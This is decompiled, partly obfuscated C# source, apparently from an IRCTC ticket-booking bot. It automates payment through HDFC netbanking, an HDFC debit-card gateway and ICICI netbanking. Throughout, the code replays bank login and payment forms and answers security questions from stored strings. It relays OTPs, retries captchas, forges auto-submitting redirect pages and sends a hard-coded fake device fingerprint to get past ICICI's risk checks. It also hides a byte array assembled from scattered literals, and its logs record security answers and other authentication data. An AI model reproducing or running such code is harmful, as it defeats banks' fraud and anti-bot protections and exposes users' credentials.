"&fldRsaAuthAction=OTPRELAY&fldOOBPhoneToken=&fldOOBPhoneRequest=&fldRsaQAAuthAvailable=N&fldRsaOOBPhoneAvailable=N&fldRsaSessionId=&fldRsaOTPAvailable=Y&fldOOBPhoneCountry=&fldOOBPhoneArea=&fldOOBPhoneNumber=&fldOOBPhoneExtn=&fldOOBPhoneLabel=&fldOOBPhoneCountryList=&fldOOBPhoneAreaList=&fldOOBPhoneNumberList=&fldOOBPhoneExtnList=&fldOOBPhoneLabelList=";
                                        if (!string.IsNullOrEmpty(text3))
                                        {
                                            string_94 = string_94.Substring(string_94.IndexOf("var l_rsaTxnId\t= ") + 17);
                                            string string_96 = string_94.Substring(1, string_94.IndexOf("\";") - 1);
                                            text6 = class3_0.Method_SerialInp(string_94, ref string_92, false);
                                            string string_97 = string_94.Substring(string_94.IndexOf("</form>") + 8);
                                            text6 = text6 + "&" + class3_0.Method_SerialInp(string_97, ref string_92, false);
                                            string_92 = "https://netbanking.hdfcbank.com/netbanking/entry";
                                            text6 = clsPostData.SetPost(text6, "fldRsaAuthTxnId", string_96);
                                            text6 = clsPostData.SetPost(text6, "fldRsaAuthAction", "OTPRELAY");
                                            text6 = clsPostData.SetPost(text6, "fldScrnSeqNbr", "06");
                                            text6 = clsPostData.SetPost(text6, "fldRsaAuthAction", "QUESTION");
                                            text6 = clsPostData.SetPost(text6, "fldOOBPhoneRequest", "N");
                                            text6 = text6.Replace("&fldAnswer=Your+answer+here", "");
                                            string text31 = text6;
                                            int num3 = 0;
                                            do
                                            {
                                                text31 = text31.Substring(text31.IndexOf("fldQuestionText=") + 16);
                                                string str6 = text31.Substring(0, text31.IndexOf("&"));
                                                str6 = HttpUtility.UrlDecode(str6);
                                                string text32 = null;
                                                if (!string.IsNullOrEmpty(text3))
                                                {
                                                    string[] array2 = Strings.Split(text3, "&&");
                                                    int num4 = Information.UBound(array2);
                                                    for (int i = 0; i <= num4; i++)
                                                    {
                                                        string[] array3 = Strings.Split(array2[i], "=");
                                                        if (str6.Contains(array3[0].Replace("*", "'")))
                                                        {
                                                            text32 = array3[1];
                                                            num3++;
                                                        }
                                                    }
                                                }
                                                text6 = text6 + "&fldAnswer=" + text32;
                                            }
                                            while (text31.IndexOf("fldQuestionText") > 0);
                                            text6 = clsPostData.SetPost(text6, "fldMerchName", text27);
                                            bool flag = num3 == 0;
                                        }
                                        clsMain.Lock("Sixth Hit : Inp = " + text6);
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(5/7)", tCntrlName_, null, null);
                                        }
                                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                                        {
                                            clsMain.Lock("Sixth Hit Failed. err = " + string_93);
                                            string_90 = "Failed while making Payment. Payment Not Done";
                                        }
                                        else
                                        {
                                            clsMain.Lock("Sixth Hit Output = " + string_94);
                                            if (string_94.Contains("<body onload=\"return logout()"))
                                            {
                                                List<string> list = new List<string>(string_94.Split(new string[1] { "<input" }, StringSplitOptions.None));
                                                list.RemoveAll((string string_0) => !string_0.ToLower().Contains("fldrequestid") && !string_0.ToLower().Contains("fldsessionid") && !string_0.ToLower().Contains("redirecturl"));
                                                string text33 = string.Empty;
                                                string text34 = string.Empty;
                                                string text35 = string.Empty;
                                                foreach (string item in list)
                                                {
                                                    if (item.ToLower().Contains("fldsessionid"))
                                                    {
                                                        text34 = item.Trim().Split(' ')[0].Split('=')[1].Trim('"');
                                                    }
                                                    if (item.ToLower().Contains("fldrequestid"))
                                                    {
                                                        text33 = item.Trim().Split(' ')[0].Split('=')[1].Trim('"');
                                                    }
                                                    if (item.ToLower().Contains("redirecturl"))
                                                    {
                                                        text35 = item.Trim().Substring(6, item.IndexOf("name") - 8).Replace("\"", "");
                                                        text35 = text35.Replace("&amp;", "%26").Replace("=", "%3D").Replace("?", "%3f");
                                                    }
                                                }
                                                text6 = "fldAppId=XT&fldTxnId=LGF&fldScrnSeqNbr=01&fldSessionId=" + text34 + "&fldRequestId=" + text33 + "&fldAppId=XT&fldTxnId=LGF&fldScrnSeqNbr=01&fldSessionId=" + text34 + "&fldRequestId=" + text33 + "&REDIRECTURL=" + text35 + "&method=P&methodtype=";
                                                goto IL_19f9;
                                            }
                                            if (string_94.Contains("document.forms[0].submit();"))
                                            {
                                                string_89 = string_94;
                                                string_90 = string_92;
                                                return true;
                                            }
                                            if (!string_94.Contains("One Time Password "))
                                            {
                                                string_90 = "Failed while Processing into HDFC after Login";
                                                clsMain.Lock("Fifth Hit Failed, Not valid HTML err = " + string_90);
                                            }
                                            else
                                            {
                                                startIndex = string_94.IndexOf("name=\"fldRequestId");
                                                startIndex = string_94.LastIndexOf("<", startIndex);
                                                startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                                text23 = string_94.Substring(startIndex, length).Trim();
                                                startIndex = string_94.IndexOf("name=\"fldRemoteAddress");
                                                startIndex = string_94.LastIndexOf("<", startIndex);
                                                startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                                text29 = string_94.Substring(startIndex, length).Trim();
                                                string string_98 = "123456";
                                                if (!method_163("Enter HDFC OTP For Branch Name:." + text26, ref string_98, ref string_90))
                                                {
                                                    return false;
                                                }
                                                text6 = "fldAppId=XT&fldTxnId=XFT&fldScrnSeqNbr=06&fldSessionId=" + text22 + "&fldRequestId=" + text23 + "&fldOtpToken=" + string_98 + "&fldTxnCurr=INR&fldMobile=on&fldCodAcctNo=" + HttpUtility.UrlEncode(str5) + "&fldBrnList=" + HttpUtility.UrlEncode(text26) + "%7E%3A%3A%7E&urlChallanDtl=&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldTxnScAmt=" + text13 + "&fldAcctList=" + HttpUtility.UrlEncode(str5) + "%7E%3A%3A%7E&fldExtSessionId=" + text28 + "&fldAdditionalFields=&fldCodOrgBrn=&fldBalList=" + text25 + "%7E%3A%3A%7E&fldRsaSessionId=&fldMerchName=" + text27 + "&fldRsaTxnType=&fldTxnAmt=" + text12 + "&fldRemoteAddress=" + text29 + "&fldMerchCode=" + text7 + "&fldMerchRefNo=" + text10 + "&fldCcyList=INR%7E%3A%3A%7E&fldRsaOTPAvailable=Y&fldRsaAuthReq=Y&fldClientCode=" + text9 + "&fldBrnName=" + HttpUtility.UrlEncode(text26) + "&fldOOBPhoneExtn=&fldMsgSentMode=M&fldPinRequired=Y&fldPin=Y&fldPinSequence=1&fldRsaAuthRetry=&fldRsaAuthTxnId=" + text30 + "&fldRsaAuthAction=OTP&fldOOBPhoneToken=&fldOOBPhoneRequest=&fldRsaQAAuthAvailable=N&fldRsaOOBPhoneAvailable=N&fldRsaSessionId=" + text28 + "&fldRsaOTPAvailable=Y&fldOOBPhoneCountry=&fldOOBPhoneArea=&fldOOBPhoneNumber=&fldOOBPhoneExtn=&fldOOBPhoneLabel=&fldOOBPhoneCountryList=&fldOOBPhoneAreaList=&fldOOBPhoneNumberList=&fldOOBPhoneExtnList=&fldOOBPhoneLabelList=";
                                                clsMain.Lock("Seventh Hit : Inp = " + text6);
                                                if (updateTStatus_1 != null)
                                                {
                                                    updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(6/7)", tCntrlName_, null, null);
                                                }
                                                if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                                                {
                                                    clsMain.Lock("Seventh Hit Failed. err = " + string_93);
                                                    string_90 = "Failed while making Payment. Payment Not Done";
                                                }
                                                else
                                                {
                                                    clsMain.Lock("Seventh Hit Output = " + string_94);
                                                    string string_99 = "";
                                                    text6 = class3_0.Method_SerialInp(string_94, ref string_99, true);
                                                    if (string_94.Contains("https://www.irctc.co.in/eticketing/BankResponse?ClientCode"))
                                                    {
                                                        goto IL_19f9;
                                                    }
                                                    string_90 = "Failed while Processing into HDFC, Ticket Not Booked";
                                                    clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_90);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        else
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment. Payment Not Done";
                        }
                    }
                    else
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "HDFC Not Working - Payment Failed";
                    }
                    goto IL_1966;
                IL_1966:
                    clsMain.Lock("First Hit Failed. err = " + string_93);
                    string_90 = "HDFC Not Working - Payment Failed";
                    text6 = "fldAppId=RS&fldTxnId=LGF&fldScrnSeqNbr=01&fldModule=CH&fldSessionId=" + text4 + "&fldRequestId=" + text5 + "&fldTxnRequest=";
                    clsMain.Lock("Seventh Hit : Inp = " + text6);
                    _Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0);
                    result2 = false;
                    goto end_IL_00d0;
                IL_19f9:
                    clsMain.Lock("Eigth Hit Inp = " + text6);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(7/7)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("Eigth Hit Failed. err = " + string_93);
                        string_90 = "Failed while making Payment at HDFC. Ticket Not Booked";
                    }
                    else
                    {
                        clsMain.Lock("Eigth Hit output = " + string_94);
                        if (string_94.Contains("document.frmredirect.submit"))
                        {
                            string_89 = string_94;
                            string_90 = string_92;
                            return true;
                        }
                        string_90 = "Failed while Processing into HDFC, Ticket Not Booked";
                        clsMain.Lock("Eigth Hit Failed, Not valid HTML err = " + string_90);
                    }
                    goto IL_1966;
                end_IL_00d0:;
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessHDFCNetBanking", ex.Message);
                    result2 = false;
                }
                return result2;
            }
            string_90 = "Some thing went wrong with HDFC Payment";
            clsMain.Lock("Html doesn't contains hdfcbank, returning.");
            return false;
        }

        internal bool method_115(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            int num2 = 0;
            bool result = false;
            clsMain.Lock("Enter ProcesshdfcDebit.");
            string string_91 = "https://www.irctc.co.in/eticketing/journeySummary.jsf?cid=1";
            do
            {
                try
                {
                    num++;
                    string_89 = "";
                    string_90 = "";
                    string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                    array[0].Trim();
                    string text = array[2];
                    string string_92 = "";
                    string text2 = "https://securepayments.fssnet.co.in/hdfcbankb";
                    string string_93 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                    CookieContainer cookieContainer_ = null;
                    string string_94 = "";
                    string string_95 = "";
                    if (text.Length == 2 && text[0] == '0')
                    {
                        text = text.Substring(1, 1);
                    }
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "HDFC_DebitCard Init.", tCntrlName_, null, null);
                    }
                    if (_Request(string_92, string_93, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                    {
                        while (true)
                        {
                            num2++;
                            string string_96 = "MCK75";
                            if (updateTStatus_1 != null)
                            {
                                updateTStatus_1.BeginInvoke(1, "HDFC_DebitCard Pay.", tCntrlName_, null, null);
                            }
                            string_93 = Class21.smethod_9(string_95, string_87, string_96, "hdfcbankb", "D");
                            string_91 = string_92;
                            string_92 = text2 + "/paymentrouter.htm";
                            clsMain.Lock("First Hit Inp = " + string_93);
                            if (_Request(string_92, string_93, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                            {
                                clsMain.Lock("First Hit output = " + string_95);
                                if (string_95.Contains("Billing Information"))
                                {
                                    if (!string_95.Contains("id=\"debitCaptchaMsg"))
                                    {
                                        break;
                                    }
                                    if (!string_95.Contains("Invalid captcha"))
                                    {
                                        if (string_95.Contains("Invalid card number"))
                                        {
                                            string_90 = "Invaild Card's Details";
                                            clsMain.Lock("Second Hit Failed. Check HTML");
                                            Class11.smethod_3(class3_0.BANKSAVEAS, "1");
                                            return false;
                                        }
                                        break;
                                    }
                                    continue;
                                }
                                if (string_95.Contains("result=CAPTURED"))
                                {
                                    string_90 = string_92;
                                    if (updateTStatus_1 != null)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "HDFC_DebitCard Sucess.", tCntrlName_, null, null);
                                    }
                                    clsMain.Lock("Success ProcessHDFCDebit ");
                                    string_93 = class3_0.Method_SerialInp(string_95, ref string_92, false);
                                    string text3 = string_95.Substring(string_95.IndexOf("responseVal = '") + 15);
                                    text3 = text3.Substring(0, text3.IndexOf("'"));
                                    string text4 = "";
                                    if (!string.IsNullOrEmpty(text3))
                                    {
                                        string[] array2 = Strings.Split(text3, "&");
                                        int num3 = Information.UBound(array2);
                                        for (int i = 0; i <= num3; i++)
                                        {
                                            string[] array3 = Strings.Split(array2[i], "=");
                                            text4 = text4 + "<input type=\"hidden\" name=\"" + array3[0] + "\" value=\"" + HttpUtility.UrlDecode(array3[1]) + "\" />";
                                        }
                                    }
                                    string_89 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en-IN\"><head><script type=\"text/javascript\" src=\"/eticketing/javax.faces.resource/scommon.js.jsf?ln=js\"></script><script type=\"text/javascript\">\t\t\t\tcheckUId(\"10599\");\t\t\t</script><script type=\"text/javascript\">\t\t\t\tsetRId(\"1520332067667\");\t\t\t</script><link type=\"text/css\" rel=\"stylesheet\" href=\"/eticketing/org.richfaces.resources/javax.faces.resource/org.richfaces.staticResource/4.2.3.Final/PackedCompressed/blueSky/skinning.css\" /></head><body><form action=\"" + string_92 + "\" method=\"POST\">" + text4 + "</form>     <center><font size=\"5\" color=\"#3b4455\">Transaction is being processed<br />Please wait ...</font></center> <script type=\"text/javascript\">\tdocument.forms[0].submit();</script></body></html>";
                                    return true;
                                }
                                if (string_95.Contains("result=NOT+CAPTURED"))
                                {
                                    string_90 = "Payment Not Captured";
                                    clsMain.Lock("Final Hit Payment Failed. err = " + string_94);
                                    return false;
                                }
                                break;
                            }
                            clsMain.Lock("Second Page Details. Check HTML" + string_94);
                            break;
                        }
                    }
                    else
                    {
                        clsMain.Lock("First Hit Failed. Check HTML" + string_94);
                    }
                    if (num >= 2)
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_94);
                        string_90 = "Failed while making Payment.";
                        return false;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessHDFCDebit", ex.Message);
                    return false;
                }
            }
            while (clsMain.method_79());
            return result;
        }

        private bool method_116(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_90 = "";
            string_91 = "";
            int num = 90000;
            clsMain.Lock("Enter ProcessICICINetBanking.");
            if (string_86.Contains("icicibank"))
            {
                string_90 = "";
                string string_92 = class3_0.string_70;
                byte[] array = new byte[357];
                string text = "\a£\u0099ÍD2ýø \0\0\0ÇL\v°\t\u0084·nÆ\u009aj\u0082\u007fÍ;>û\u0014\u0099ÔïÞ×3Üìù\u00854\u0019Q\u0089";
                for (int i = 0; i < text.Length; i++)
                {
                    array[i + 117] = (byte)text[i];
                }
                string[] array2 = new string[1];
                array[97] = 220;
                array2[0] = "||";
                string[] separator = array2;
                array[98] = 68;
                string[] array3 = string_88.Split(separator, StringSplitOptions.None);
                string text2 = "\nV2øü\u008cìÁÝGª\u007fMòn£Ì\u00a0";
                for (int j = 0; j < text2.Length; j++)
                {
                    array[j + 99] = (byte)text2[j];
                }
                string string_93 = array3[0].Trim();
                string text3 = array3[1];
                string string_94 = array3[2];
                string string_95 = "";
                string text4;
                if (bool_13)
                {
                    bool_13 = false;
                    string[] array4 = string_86.Split(new string[1] { "|" }, StringSplitOptions.None);
                    text4 = array4[0];
                    string_95 = array4[1];
                }
                else
                {
                    text4 = class3_0.Method_SerialInp(string_86, ref string_95, false);
                }
                CookieContainer cookieContainer_ = null;
                string text5 = "https://shopping.icicibank.com/corp/";
                string string_96 = "";
                string string_97 = "";
                array[96] = 113;
                new object();
                int num2 = 0;
                try
                {
                    array[94] = byte.MaxValue;
                    array[154] = 236;
                    array[155] = 249;
                    array[156] = 133;
                    array[157] = 52;
                    array[153] = 220;
                    array[158] = 25;
                    array[159] = 81;
                    array[160] = 137;
                    array[152] = 51;
                    array[93] = 120;
                    array[95] = 94;
                    Class27.byte_3 = array;
                    clsMain.Lock("First Hit : Inp = " + text4);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. ICICI_NB(1/4)", tCntrlName_, null, null);
                    }
                    if (!_Request(string_95, text4, string_92, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_97, ref string_96, ref webException_0))
                    {
                        string_91 = "ICICI Bank is not working.";
                        return false;
                    }
                    if (!string.IsNullOrEmpty(string_97.Trim()) && string_97.Contains("User ID"))
                    {
                        string text6 = "";
                        int startIndex = string_97.IndexOf("name=\"AuthenticationFG") + 10;
                        startIndex = string_97.IndexOf("=\"", startIndex) + 2;
                        int length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text7 = string_97.Substring(startIndex, length);
                        string text8 = class3_0.Method_SerialInp(string_97, ref string_95, true);
                        text8 = text8.Replace("buffer=&buffer=&alp_=&pp_=&pp_=&pp_caps=CAPS&pp_caps=CAPS&pp_erase=BACKSPACE&pp_clear=CLEAR&done=OK&RadioFlag=1&RadioFlag=2&RadioFlag=3", "").Replace("&Action.FORGOT_PWD=Go", "").Replace("&Action.VALIDATE_MOBILE_LOGIN=", "");
                        text8 = "RadioFlag=1&" + text8;
                        text8 += "&deviceDNA=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%221fa81f7f4c5685f36dbde63c4386a6bf%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F47.0.2526.106+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22+%2C+%2C+%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22116.202.249.241%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D434828%3Bldi%3D204%3Bmesc%3D504593%3Bldi%3D509%22%2C%22DESC%22%3A%22%22%7D&executionTime=819&desc=&mesc=mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D434828%3Bldi%3D204%3Bmesc%3D504593%3Bldi%3D509&dnaError=&mescIterationCount=2&isDNADone=true&arcotFlashCookie=undefined&DEVICE_ID=undefined&DEVICE_TYPE=DEVICEID.FLASH&MACHINE_FINGER_PRINT=%7B%22VERSION%22%3A%221.0%22%2C%22MFP%22%3A%7B%22System%22%3A%7B%22Platform%22%3A%22Win32%22%2C%22Language%22%3A%22en-US%22%2C%22Timezone%22%3A-330%2C%22Fonts%22%3A%221fa81f7f4c5685f36dbde63c4386a6bf%22%7D%2C%22Screen%22%3A%7B%22FullHeight%22%3A768%2C%22AvlHeight%22%3A728%2C%22FullWidth%22%3A1366%2C%22AvlWidth%22%3A1366%2C%22BufferDepth%22%3A%22%22%2C%22ColorDepth%22%3A24%2C%22PixelDepth%22%3A24%2C%22DeviceXDPI%22%3A%22%22%2C%22DeviceYDPI%22%3A%22%22%2C%22FontSmoothing%22%3A%22%22%2C%22UpdateInterval%22%3A%22%22%7D%2C%22Browser%22%3A%7B%22UserAgent%22%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F47.0.2526.106+Safari%2F537.36%22%2C%22Vendor%22%3A%22Google+Inc.%22%2C%22VendorSubID%22%3A%22%22%2C%22BuildID%22%3A%22%22%2C%22CookieEnabled%22%3Atrue%7D%2C%22Camera%22%3A%22%22%2C%22Microphone%22%3A%22+%2C+%2C+%22%7D%2C%22MAC%22%3A%22%22%2C%22ExternalIP%22%3A%22116.202.249.241%22%2C%22InternalIP%22%3A%22%22%2C%22MESC%22%3A%22mi%3D2%3Bcd%3D200%3Bid%3D50%3Bmesc%3D434828%3Bldi%3D204%3Bmesc%3D504593%3Bldi%3D509%22%2C%22DESC%22%3A%22%22%7D&Action.VALIDATE_CREDENTIALS=+";
                        text8 = clsPostData.SetPost(text8, "AuthenticationFG.USER_PRINCIPAL", string_93);
                        text8 = clsPostData.SetPost(text8, "JS_ENABLED_FLAG", "Y");
                        string text9 = text8.Substring(text8.IndexOf("KEY__") + 6);
                        text9 = HttpUtility.UrlDecode(text9.Substring(0, text9.IndexOf("&")));
                        string text10 = "";
                        string text11 = "ICICI1";
                        updateTStatus_2?.Invoke(1004, text11 + "||" + text3 + "||" + text9, "");
                        if (clsMain.dictionary_5.ContainsKey(text11))
                        {
                            object obj = new object();
                            object obj2 = obj;
                            lock (obj2)
                            {
                                text10 = clsMain.dictionary_5[text11];
                                method_61("Encrypted Data, out = " + text10);
                                clsMain.dictionary_5.Remove(text11);
                            }
                        }
                        text8 = clsPostData.SetPost(text8, "AuthenticationFG.ACCESS_CODE", text10);
                        text8 = clsPostData.SetPost(text8, "AuthenticationFG.UBA_PASSWORD", "");
                        string text12 = "";
                        Thread.Sleep(200);
                        string text13 = "ICICI2";
                        updateTStatus_2?.Invoke(1004, text13 + "||dummy3||" + text9, "");
                        if (clsMain.dictionary_5.ContainsKey(text13))
                        {
                            object obj3 = new object();
                            object obj4 = obj3;
                            lock (obj4)
                            {
                                text12 = clsMain.dictionary_5[text13];
                                method_61("Encrypted Data, out = " + text12);
                                clsMain.dictionary_5.Remove(text13);
                            }
                        }
                        text8 = clsPostData.SetPost(text8, "dummy1", text12);
                        text4 = text8;
                        string_95 = text5 + text7;
                        string_92 = string_95;
                        string_95 = text5 + text7;
                        clsMain.Lock("Second Hit : Inp = " + text4);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. ICICI_NB(2/4)", tCntrlName_, null, null);
                        }
                        if (!_Request(string_95, text4, string_92, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_97, ref string_96, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_96);
                            string_91 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        string_92 = string_95;
                        clsMain.Lock("Second Hit Output = " + string_97);
                        if (!string_97.Contains("Make a Payment"))
                        {
                            if (string_97.Contains("errormsg"))
                            {
                                startIndex = string_97.IndexOf("errormsg");
                                startIndex = string_97.IndexOf(">", startIndex) + 1;
                                length = string_97.IndexOf("<", startIndex) - startIndex;
                                string_91 = string_97.Substring(startIndex, length).Trim();
                            }
                            if (string_97.Contains("Password is case-sensitive"))
                            {
                                string_91 = "Invalid ICICI UserID or Password";
                            }
                            else if (string.IsNullOrEmpty(string_91))
                            {
                                string_91 = "Failed while Login into ICICI";
                            }
                            clsMain.Lock("Second Hit, Not valid HTML err = " + string_91);
                            return false;
                        }
                        startIndex = string_97.IndexOf("name=\"TranRequestManagerFG") + 10;
                        startIndex = string_97.IndexOf("=\"", startIndex) + 2;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        text7 = string_97.Substring(startIndex, length);
                        startIndex = string_97.IndexOf("TranRequestManagerFG.INITOR_ACCOUNT");
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text14 = string_97.Substring(startIndex, length).Trim();
                        startIndex = string_97.IndexOf("name=\"Transaction") + 10;
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string_97.Substring(startIndex, length).Trim();
                        startIndex = string_97.IndexOf("cxpsUserId", startIndex);
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text15 = string_97.Substring(startIndex, length).Trim();
                        startIndex = string_97.IndexOf("corpId", startIndex);
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text16 = string_97.Substring(startIndex, length).Trim();
                        startIndex = string_97.IndexOf("usertype", startIndex);
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text17 = string_97.Substring(startIndex, length).Trim();
                        startIndex = string_97.IndexOf("Requestid", startIndex);
                        startIndex = string_97.IndexOf("lue=\"", startIndex) + 5;
                        length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string text18 = string_97.Substring(startIndex, length).Trim();
                        text4 = "TranRequestManagerFG.INITOR_ACCOUNT=" + text14 + "&TranRequestManagerFG.DESTINATION_TYPE=M&TranRequestManagerFG.DESTINATION_NICK_NAME_M=IRCTC+Ltd%28PAYTM+MOBILE+SOLUTION%29&TranRequestManagerFG.ENT_REMARKS=&Action.CONTINUE_TRANSACTION=PAY&FG_BUTTONS__=ADDNL_INFO%2CADD_ENTRY%2CSAVE_TRANSACTION%2CCONTINUE_TRANSACTION%2CFREQ_TYPE_GO%2CVIEW_OWN_ACNT_DET%2CLOOK_UP%2CADD_COUNTER_PARTY%2CCHECK_COUNTER_RATE%2CBACK_TO_ACTION%2CBACK_FOR_CP&TranRequestManagerFG.SINGLE_FREQ_TYPE=O&TranRequestManagerFG.SINGLE_NWK_TYP=WIB&TranRequestManagerFG.SINGLE_TRAN_PURPOSE=ITX&TranRequestManagerFG.VAL_IND=N&TranRequestManagerFG.END_DATE_UPDATE=-1&TranRequestManagerFG.TERMS_AND_COND_FLAG=Y&Transaction=SHP&FORMSGROUP_ID__=TranRequestManagerFG&TranRequestManagerFG.REPORTTITLE=InitiateSimplePaymentShoppingMall&counterPartyNickName=&amountSendToCxps=&counterPartyTpe=&freqTyp=O&bankId=ICI&cxpsUserId=" + text15 + "&corpId=" + text15 + "&usertype=1&RECEIVED_RESPONSE=&FieldDropdown=&MFPrint=&xyz=&ABC=ABC&JS_ENABLED_FLAG=N&CHECKBOX_NAMES__=&Requestid=1&TranRequestManagerFG.__COLLAPSIBLE_IDS__=%7C";
                        text4 = "TranRequestManagerFG.INITOR_ACCOUNT=" + text14 + "&TranRequestManagerFG.DESTINATION_TYPE=M&TranRequestManagerFG.DESTINATION_NICK_NAME_M=IRCTC+Ltd%28PAYTM+MOBILE+SOLUTION%29&TranRequestManagerFG.ENT_REMARKS=&Action.SUBMIT_TRANSACTION=PAY&FG_BUTTONS__=SUBMIT_TRANSACTION%2CBACK_CONTINUE%2CSEL_USER_LOOKUP&TranRequestManagerFG.SINGLE_FREQ_TYPE=O&TranRequestManagerFG.SINGLE_NWK_TYP=WIB&TranRequestManagerFG.SINGLE_TRAN_PURPOSE=ITX&TranRequestManagerFG.VAL_IND=N&TranRequestManagerFG.END_DATE_UPDATE=-1&TranRequestManagerFG.TERMS_AND_COND_FLAG=Y&Transaction=SHP&FORMSGROUP_ID__=TranRequestManagerFG&TranRequestManagerFG.REPORTTITLE=InitiateSimplePaymentShoppingMall&counterPartyNickName=One97+Communication+ltd%28PAYTM+MOBILE+SOLUTION%29&amountSendToCxps=&counterPartyTpe=&freqTyp=O&bankId=ICI&cxpsUserId=" + text15 + "&corpId=" + text15 + "&usertype=1&RECEIVED_RESPONSE=&FieldDropdown=&MFPrint=&xyz=&ABC=ABC&JS_ENABLED_FLAG=N&CHECKBOX_NAMES__=&Requestid=1&TranRequestManagerFG.__COLLAPSIBLE_IDS__=%7C";
                        string_95 = text5 + text7;
                        clsMain.Lock("Third Hit Inp = " + text4);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. ICICI_NB(3/4)", tCntrlName_, null, null);
                        }
                        if (!_Request(string_95, text4, string_92, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_97, ref string_96, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_96);
                            string_91 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        string_92 = string_95;
                        clsMain.Lock("Third Hit Output = " + string_97);
                        if (!string_97.Contains("Your Merchant Reference Number is"))
                        {
                            if (!string_97.Contains("Confirm Details"))
                            {
                                string_91 = "";
                                if (string_97.Contains("errormsg"))
                                {
                                    startIndex = string_97.IndexOf("errormsg");
                                    startIndex = string_97.IndexOf(">", startIndex) + 1;
